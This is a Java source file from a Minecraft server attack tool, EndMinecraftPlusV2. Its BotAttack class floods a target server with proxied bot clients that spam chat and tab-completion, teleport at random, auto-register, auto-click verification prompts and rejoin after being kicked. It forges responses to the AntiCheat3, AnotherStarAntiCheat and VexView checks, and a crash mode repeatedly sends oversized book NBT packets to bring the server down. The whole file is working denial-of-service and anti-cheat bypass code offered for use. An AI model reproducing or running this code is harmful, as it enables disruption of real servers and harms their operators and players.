package cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils;

import cn.serendipityr.EndMinecraftPlusV2.EndMinecraftPlusV2;
import cn.serendipityr.EndMinecraftPlusV2.Tools.*;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.AttackManager;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AnotherStarAntiCheat;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AntiCheat3;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForge;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.ProtocolLibs;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.VersionSupport578;
import com.github.steveice10.mc.protocol.MinecraftProtocol;
import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
import com.github.steveice10.mc.protocol.data.message.Message;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.player.ClientPlayerMovementPacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerChatPacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.entity.player.ServerPlayerPositionRotationPacket;
import com.github.steveice10.opennbt.NBTIO;
import com.github.steveice10.opennbt.tag.builtin.CompoundTag;
import com.github.steveice10.opennbt.tag.builtin.ListTag;
import com.github.steveice10.opennbt.tag.builtin.StringTag;
import com.github.steveice10.opennbt.tag.builtin.Tag;
import com.github.steveice10.packetlib.Client;
import com.github.steveice10.packetlib.ProxyInfo;
import com.github.steveice10.packetlib.Session;
import com.github.steveice10.packetlib.event.session.*;
import com.github.steveice10.packetlib.io.stream.StreamNetOutput;
import com.github.steveice10.packetlib.packet.Packet;
import com.github.steveice10.packetlib.tcp.TcpSessionFactory;
import io.netty.util.internal.ConcurrentSet;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class BotAttack extends IAttack {
    public static HashMap<Client, String> clientName = new HashMap<>();
    public static int failed = 0;
    public static int rejoin = 0;
    public static int clickVerifies = 0;
    public static List<String> alivePlayers = new ArrayList<>();
    public static List<String> rejoinPlayers = new ArrayList<>();
    public static List<Session> joinedPlayers = new ArrayList<>();
    public static HashMap<Session, ServerPlayerPositionRotationPacket> positionPacket = new HashMap<>();
    protected boolean attack_motdbefore;
    protected boolean attack_tab;
    protected Map<String, String> modList;

    private Thread mainThread;
    private Thread tabThread;
    private Thread taskThread;

    public Set<Client> clients = new ConcurrentSet<>();
    public ExecutorService pool = Executors.newCachedThreadPool();

    private static final AntiCheat3 ac3 = new AntiCheat3();
    private static final AnotherStarAntiCheat asac = new AnotherStarAntiCheat();

    private long starttime;

    public BotAttack(String ip, int port, int time, int maxconnect, long joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void setBotConfig(boolean motdbefore, boolean tab, Map<String, String> modList) {
        this.attack_motdbefore = motdbefore;
        this.attack_tab = tab;
        this.modList = modList;
    }

    public String getRandMessage(String userName) {
        return ConfigUtil.CustomChat.get(new Random().nextInt(ConfigUtil.CustomChat.size())).replace("$rnd",OtherUtils.getRandomString(4,6).replace("$pwd",DataUtil.botRegPasswordsMap.get(userName)));
    }

    public void start() {
        setTask(() -> {
            while (true) {
                for (Client c : clients) {
                    if (c.getSession().isConnected()) {
                        if (c.getSession().hasFlag("login")) {
                            if (ConfigUtil.ChatSpam) {
                                c.getSession().send(new ClientChatPacket(getRandMessage(clientName.get(c))));
                                OtherUtils.doSleep(ConfigUtil.ChatDelay);
                            }

                            if (ConfigUtil.RandomTeleport) {
                                ServerPlayerPositionRotationPacket positionRotationPacket = positionPacket.get(c.getSession());
                                if (c.getSession().isConnected() && positionRotationPacket != null) {
                                    new Thread(() -> {
                                        try {
                                            cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.MultiVersionPacket.sendPosPacket(c.getSession(), positionRotationPacket.getX() + OtherUtils.getRandomInt(-10, 10), positionRotationPacket.getY() + OtherUtils.getRandomInt(2, 8), positionRotationPacket.getZ() + OtherUtils.getRandomInt(-10, 10), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                            Thread.sleep(500);
                                            cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.MultiVersionPacket.sendPosPacket(c.getSession(), positionRotationPacket.getX(), positionRotationPacket.getY(), positionRotationPacket.getZ(), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                        } catch (InterruptedException e) {
                                            throw new RuntimeException(e);
                                        }
                                    }).start();
                                }
                            }

                            if (ConfigUtil.ServerCrasher && !c.getSession().hasFlag("crasher")) {
                                c.getSession().setFlag("crasher", true);

                                switch (ConfigUtil.ServerCrasherMode) {
                                    case 1:
                                        new Thread(() -> {
                                            LogUtil.doLog(0, "[" + clientName.get(c) + "] 开始发送Crash Packet...", "ServerCrasher");

                                            while (true) {
                                                try {
                                                    ItemStack crashBook = getCrashBook();

                                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                                    StreamNetOutput out = new StreamNetOutput(buf);

                                                    out.writeShort(crashBook.getId());
                                                    out.writeByte(crashBook.getAmount());

                                                    NBTIO.writeTag(buf, crashBook.getNbt());

                                                    byte[] crashData = buf.toByteArray();

                                                    c.getSession().send(new ClientPluginMessagePacket("MC|BEdit", crashData));
                                                    c.getSession().send(new ClientPluginMessagePacket("MC|BSign", crashData));

                                                    Thread.sleep(ConfigUtil.ServerCrasherPacketDelay);
                                                } catch (Exception ignored) {}
                                            }
                                        }).start();
                                        break;
                                    default:
                                }
                            }
                        } else if (c.getSession().hasFlag("join")) {
                            if (ConfigUtil.RegisterAndLogin) {
                                for (String cmd:ConfigUtil.RegisterCommands) {
                                    OtherUtils.doSleep(ConfigUtil.ChatDelay);
                                    c.getSession().send(new ClientChatPacket(cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c)))));
                                }
                                LogUtil.doLog(0, "[" + clientName.get(c) + "] 注册信息已发送。", "BotAttack");
                            }

                            c.getSession().setFlag("login", true);
                        }
                    }
                }
            }
        });

        this.starttime = System.currentTimeMillis();

        mainThread = new Thread(() -> {
            while (true) {
                try {
                    createClients(ip, port);

                    if (this.attack_time > 0 && (System.currentTimeMillis() - this.starttime) / 1000 > this.attack_time) {
                        for (Client c : clients) {
                            c.getSession().disconnect("");
                        }

                        stop();
                        return;
                    }

                    OtherUtils.doSleep(ConfigUtil.ConnectTimeout);
                    LogUtil.doLog(0, "当前连接数: " + clients.size() + "个", "BotAttack");
                    cleanClients();
                } catch (Exception e) {
                    LogUtil.doLog(1, "发生错误: " + e, null);
                }
            }
        });

        if (this.attack_tab) {
            tabThread = new Thread(() -> {
                while (true) {
                    for (Client c : clients) {
                        if (c.getSession().isConnected() && c.getSession().hasFlag("login")) {
                            MultiVersionPacket.sendTabPacket(c.getSession(), "/");
                        }
                    }

                    OtherUtils.doSleep(10);
                }
            });
        }

        mainThread.start();
        if (tabThread != null)
            tabThread.start();
        if (taskThread != null)
            taskThread.start();
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        mainThread.stop();
        if (tabThread != null)
            tabThread.stop();
        if (taskThread != null)
            taskThread.stop();
    }

    public void setTask(Runnable task) {
        taskThread = new Thread(task);
    }

    private void cleanClients() {
        for (Client client:clients) {
            String username = clientName.get(client);

            if (!client.getSession().isConnected()) {
                positionPacket.remove(client.getSession());
                alivePlayers.remove(username);
                clientName.remove(client);
                clients.remove(client);
            } else {
                if (!alivePlayers.contains(username) && (client.getSession().hasFlag("login") || client.getSession().hasFlag("join"))) {
                    alivePlayers.add(username);
                }
            }
        }
    }

    private void createClients(final String ip, int port) {
        Proxy.Type proxyType;
        switch (ConfigUtil.ProxyType) {
            case 3:
            case 2:
                proxyType = Proxy.Type.SOCKS;
                break;
            case 1:
            default:
                proxyType = Proxy.Type.HTTP;
                break;
        }

        for (String p: ProxyUtil.proxies) {
            try {
                if (!EndMinecraftPlusV2.isLinux) {
                    SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joinedPlayers.size() + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
                }

                String[] _p = p.split(":");
                Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                String[] User = AttackManager.getRandomUser().split("@");
                Client client = createClient(ip, port, User[0], proxy);
                client.getSession().setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
                client.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
                clientName.put(client, User[0]);
                clients.add(client);
                ProxyUtil.clientsProxy.put(client.getSession(), proxy);

                pool.submit(() -> {
                    if (this.attack_motdbefore) {
                        getMotd(proxy, ip, port);
                    }

                    client.getSession().connect(false);
                });

                if (this.attack_joinsleep > 0) {
                    OtherUtils.doSleep(attack_joinsleep);
                }

                if (clients.size() > this.attack_maxconnect) {
                    break;
                }
            } catch (Exception e) {
                LogUtil.doLog(1, "发生错误: " + e, null);
            }
        }
    }

    public Client createClient(final String ip, int port, final String username, Proxy proxy) {
        Client client;

        if (ProtocolLibs.adaptAfter578) {
            String proxyStr = String.valueOf(proxy.address()).replace("/", "");
            String[] proxyAddress = proxyStr.split(":");
            ProxyInfo.Type proxyType;

            switch (ConfigUtil.ProxyType) {
                case 2:
                    proxyType = ProxyInfo.Type.SOCKS4;
                    break;
                case 3:
                    proxyType = ProxyInfo.Type.SOCKS5;
                    break;
                case 1:
                default:
                    proxyType = ProxyInfo.Type.HTTP;
                    break;
            }

            ProxyInfo proxyInfo = new ProxyInfo(proxyType, new InetSocketAddress(proxyAddress[0], Integer.parseInt(proxyAddress[1])));
            client = new Client(ip, port, new MinecraftProtocol(username), new VersionSupport578().createTcpSessionFactory(proxyInfo));
        } else {
            client = new Client(ip, port, new MinecraftProtocol(username), new TcpSessionFactory(proxy));
        }

        if (ConfigUtil.ForgeSupport) {
            modList.putAll(ConfigUtil.ForgeModList);
            new MCForge(client.getSession(), this.modList).init();
        }

        client.getSession().addListener(new SessionListener() {
            public void packetReceived(PacketReceivedEvent e) {
                new Thread(() -> handlePacket(e.getSession(), e.getPacket(), username)).start();
            }

            public void packetReceived(Session session, Packet packet) {
                new Thread(() -> {
                    handlePacket(session, packet, username);
                }).start();
            }

            public void packetSending(PacketSendingEvent packetSendingEvent) {

            }

            public void packetSent(Session session, Packet packet) {

            }

            public void packetSent(PacketSentEvent packetSentEvent) {

            }

            public void packetError(PacketErrorEvent packetErrorEvent) {

            }

            public void connected(ConnectedEvent e) {
                if (ConfigUtil.SaveWorkingProxy) {
                    ProxyUtil.saveWorkingProxy(proxy);
                }
            }

            public void disconnecting(DisconnectingEvent e) {
            }

            public void disconnected(DisconnectedEvent e) {
                new Thread(() -> {
                    String msg;

                    if (e.getCause() == null) {
                        msg = e.getReason();
                        LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + msg, "BotAttack");

                        for (String rejoinDetect:ConfigUtil.RejoinDetect) {
                            if (rejoinPlayers.contains(username)) {
                                break;
                            }

                            if (msg.contains(rejoinDetect)) {
                                rejoinPlayers.add(username);

                                for (int i = 0; i < ConfigUtil.RejoinCount; i++) {
                                    OtherUtils.doSleep(ConfigUtil.RejoinDelay);

                                    Client rejoinClient = createClient(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, username, proxy);
                                    rejoinClient.getSession().setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
                                    rejoinClient.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));

                                    rejoin++;
                                    LogUtil.doLog(0,"[假人尝试重连] [" + username + "] [" + proxy + "]", "BotAttack");
                                    clientName.put(rejoinClient, username);
                                    clients.add(rejoinClient);
                                    rejoinClient.getSession().connect(false);
                                    ProxyUtil.clientsProxy.put(client.getSession(), proxy);

                                    if (rejoinClient.getSession().hasFlag("join") || rejoinClient.getSession().hasFlag("login")) {
                                        rejoinPlayers.remove(username);
                                        break;
                                    }
                                }

                                rejoinPlayers.remove(username);
                            }
                        }
                    } else if (ConfigUtil.ShowFails) {
                        LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + e.getCause(), "BotAttack");
                    }

                    failed++;
                    alivePlayers.remove(username);
                }).start();
            }
        });
        return client;
    }

    public void getMotd(Proxy proxy, String ip, int port) {
        try {
            Socket socket = new Socket(proxy);
            socket.connect(new InetSocketAddress(ip, port));

            if (socket.isConnected()) {
                OutputStream out = socket.getOutputStream();
                out.write(new byte[]{0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01});
                out.write(new byte[]{0x01, 0x00});
                out.flush();
            }

            socket.close();
        } catch (Exception ignored) {}
    }

    protected void handlePacket(Session session, Packet recvPacket, String username) {
        if (recvPacket instanceof ServerPluginMessagePacket) {
            ServerPluginMessagePacket packet = (ServerPluginMessagePacket) recvPacket;
            switch (packet.getChannel()) {
                case "AntiCheat3.4.3":
                    String code = ac3.uncompress(packet.getData());
                    byte[] checkData = ac3.getCheckData("AntiCheat3.jar", code,
                            new String[]{"44f6bc86a41fa0555784c255e3174260"});
                    session.send(new ClientPluginMessagePacket("AntiCheat3.4.3", checkData));
                    break;
                case "anotherstaranticheat":
                    String salt = asac.decodeSPacket(packet.getData());
                    byte[] data = asac.encodeCPacket(new String[]{"4863f8708f0c24517bb5d108d45f3e15"}, salt);
                    session.send(new ClientPluginMessagePacket("anotherstaranticheat", data));
                    break;
                case "VexView":
                    if (new String(packet.getData()).equals("GET:Verification"))
                        session.send(new ClientPluginMessagePacket("VexView", "Verification:1.8.10".getBytes()));
                    break;
                default:
            }
        } else if (recvPacket instanceof ServerJoinGamePacket) {
            session.setFlag("join", true);
            LogUtil.doLog(0, "[假人加入服务器] [" + username + "]", "BotAttack");

            joinedPlayers.add(session);

            if (!alivePlayers.contains(username)) {
                alivePlayers.add(username);
            }

            MultiVersionPacket.sendClientSettingPacket(session, "zh_CN");
            MultiVersionPacket.sendClientPlayerChangeHeldItemPacket(session, 1);
        } else if (recvPacket instanceof ServerPlayerPositionRotationPacket) {
            try {
                ServerPlayerPositionRotationPacket packet = (ServerPlayerPositionRotationPacket) recvPacket;
                MultiVersionPacket.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
                session.send(new ClientPlayerMovementPacket(true));
                MultiVersionPacket.sendClientTeleportConfirmPacket(session, packet);
                positionPacket.put(session, packet);
            } catch (Exception ignored) {}

        } else if (recvPacket instanceof ServerChatPacket) {
            ServerChatPacket chatPacket = (ServerChatPacket) recvPacket;

            Message message = chatPacket.getMessage();

            if (ProtocolLibs.adaptAfter578) {
                Map<String, String> result = VersionSupport578.clickVerifiesHandle(message, session, ConfigUtil.ClickVerifiesDetect);

                if (result.get("result").contains("true")) {
                    LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get("msg"), "BotAttack");
                    clickVerifies++;
                }
            } else {
                clickVerifiesHandle(message, session, username);
            }

            if (!joinedPlayers.contains(session)) {
                joinedPlayers.add(session);
            }

            if (!alivePlayers.contains(username)) {
                alivePlayers.add(username);
            }

            if (ConfigUtil.ShowServerMessages && !message.getFullText().equals("")) {
                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + message.getFullText(), "BotAttack");
            }
        } else if (recvPacket instanceof ServerKeepAlivePacket) {
            ClientKeepAlivePacket keepAlivePacket = new ClientKeepAlivePacket(((ServerKeepAlivePacket) recvPacket).getPingId());
            session.send(keepAlivePacket);

            if (!alivePlayers.contains(username)) {
                alivePlayers.add(username);
            }

            if (!joinedPlayers.contains(session)) {
                joinedPlayers.add(session);
            }
        }
    }

    public static void clickVerifiesHandle(Message message, Session session, String username) {
        boolean needClick = false;

        if (message.getStyle().getClickEvent() != null) {
            for (String clickVerifiesDetect:ConfigUtil.ClickVerifiesDetect) {
                if (message.getText().contains(clickVerifiesDetect)) {
                    needClick = true;
                    break;
                }
            }
        }

        if (needClick) {
            LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + message.getStyle().getClickEvent().getValue(), "BotAttack");
            session.send(new ClientChatPacket(message.getStyle().getClickEvent().getValue()));
            clickVerifies++;
        }

        if (message.getExtra() != null && !message.getExtra().isEmpty()) {
            for (Message extraMessage:message.getExtra()) {
                clickVerifiesHandle(extraMessage, session, username);
            }
        }
    }

    public static ItemStack getCrashBook() {
        ItemStack crashBook = null;
        CompoundTag nbtTag = new CompoundTag("crashBook");
        List<Tag> pageList = new ArrayList<>();

        // Plain Mode
        nbtTag.put(new StringTag("author", OtherUtils.getRandomString(20, 20)));
        nbtTag.put(new StringTag("title", OtherUtils.getRandomString(20, 20)));

        for (int a = 0; a < 35; a++) {
            pageList.add(new StringTag("", OtherUtils.getRandomString(600, 600)));
        }

        nbtTag.put(new ListTag("pages", pageList));
        crashBook = new ItemStack(386, 1, nbtTag);

        return crashBook;
    }
}
